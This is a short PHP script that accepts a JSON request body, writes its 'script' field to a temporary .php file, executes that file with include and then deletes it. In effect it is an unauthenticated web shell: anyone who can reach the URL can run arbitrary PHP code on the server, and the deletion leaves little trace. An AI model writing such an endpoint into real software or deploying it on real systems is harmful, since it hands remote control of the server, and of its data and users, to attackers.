<?php
    $jsonData = file_get_contents('php://input');
    $data = json_decode($jsonData, true);
    if ($data === null) {
        echo json_encode(array('error' => 'Invalid JSON data'));
        exit;
    }
    $name=time().".php";
    $myfile = fopen($name, "w");
    fwrite($myfile, "<?php\n".$data["script"]);
    fclose($myfile);
    include $name;
    unlink($name);
?>
